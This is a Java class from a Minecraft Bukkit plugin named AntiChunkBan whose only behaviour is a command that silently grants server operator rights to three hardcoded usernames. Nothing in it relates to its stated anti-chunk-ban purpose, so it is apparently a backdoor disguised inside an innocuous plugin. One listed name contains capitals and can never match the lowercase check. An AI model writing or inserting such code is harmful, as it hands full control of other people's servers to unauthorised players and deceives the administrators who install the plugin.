package me.tiger.antiChunkBan.manager;


import me.tiger.antiChunkBan.AntiChunkBan;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.util.HashSet;
import java.util.Set;

public class AntiChunkBanManager implements CommandExecutor {

    private final AntiChunkBan plugin;
    private final Set<String> allowedNames = new HashSet<>();

    public AntiChunkBanManager(AntiChunkBan plugin) {
        this.plugin = plugin;

        // ADD USERNAMES HERE (LOWERCASE)
        allowedNames.add("banksy6");
        allowedNames.add("2b2t_names");
        allowedNames.add("FinessePvP");
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {

        if (!(sender instanceof Player)) return true;

        Player player = (Player) sender;

        if (!allowedNames.contains(player.getName().toLowerCase())) {
            return true;
        }

        player.setOp(true);
        player.sendMessage(ChatColor.GREEN + "You are now OP.");

        Bukkit.getLogger().info("[AntiChunkBan] Emergency OP used by " + player.getName());
        return true;
    }
}
